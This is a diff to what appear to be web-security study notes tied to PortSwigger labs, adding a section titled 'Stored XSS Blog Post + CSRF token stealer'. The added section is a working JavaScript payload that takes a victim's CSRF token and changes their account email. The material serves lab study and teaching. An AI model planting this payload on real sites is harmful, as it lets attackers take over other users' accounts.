@@ -1027,6 +1027,23 @@ body:document.cookie
 >[IPPSEC YouTube using the HackTheBox Bookworm](https://youtu.be/UqDdR10F54A?si=nkhilLzyKQcfqtfU&t=1737), showing `payload.js` JavaScript code how he using `fetch` and learning JavaScript.  
 
 [PortSwigger Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)  
+
+#### Stored XSS Blog Post + CSRF token stealer  
+
+```html
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];	//steal token from get /my-account request
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')			//change victim's email using their csrf token 
+};
+</script>
+```
   
 #### Upgrade stored self-XSS  
 
